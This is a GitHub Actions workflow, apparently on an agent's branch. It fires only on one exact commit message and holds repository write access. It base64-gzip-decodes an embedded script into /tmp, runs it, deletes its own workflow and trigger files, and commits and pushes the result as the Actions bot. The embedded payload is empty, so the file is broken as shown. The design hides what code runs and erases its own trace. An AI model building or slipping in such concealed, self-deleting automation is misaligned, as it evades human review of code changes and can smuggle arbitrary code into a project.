name: Sync verifier routing stewardship

on:
  push:
    branches:
      - agent/independent-verifier-routing

permissions:
  contents: write

jobs:
  sync:
    if: github.event.head_commit.message == 'Run verifier routing stewardship sync'
    runs-on: ubuntu-latest
    steps:
      - name: Checkout branch
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          ref: agent/independent-verifier-routing
          fetch-depth: 0
      - name: Apply canonical stewardship updates
        shell: bash
        run: |
          python - <<'PY'
          import base64, gzip
          from pathlib import Path
          payload=''
          Path('/tmp/sync.py').write_bytes(gzip.decompress(base64.b64decode(payload)))
          PY
          python /tmp/sync.py
          rm .github/workflows/sync-verifier-routing-stewardship.yml
          rm -f .verifier-routing-stewardship-trigger
          git diff --check
      - name: Commit stewardship sync
        shell: bash
        run: |
          git config user.name 'github-actions[bot]'
          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
          git add -A
          git commit -m 'Sync verifier routing stewardship'
          git push origin HEAD:agent/independent-verifier-routing
